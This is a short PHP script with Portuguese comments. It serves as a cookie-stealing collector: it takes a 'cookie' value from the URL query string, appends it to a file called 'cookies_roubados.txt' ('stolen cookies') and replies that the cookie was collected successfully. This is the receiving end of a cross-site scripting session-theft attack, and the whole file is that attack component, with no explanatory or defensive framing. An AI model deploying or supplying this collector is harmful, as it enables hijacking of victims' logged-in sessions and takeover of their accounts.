<?php
// Obtém o valor do cookie da URL
$cookie = $_GET['cookie'];

// Define o nome do arquivo para salvar o cookie
$filename = 'cookies_roubados.txt';

// Adiciona o cookie ao arquivo
$file = fopen($filename, 'a');
fwrite($file, "Cookie Roubado: " . $cookie . "\n");
fclose($file);

// Retorna uma resposta simples
echo "Cookie coletado com sucesso!";
?>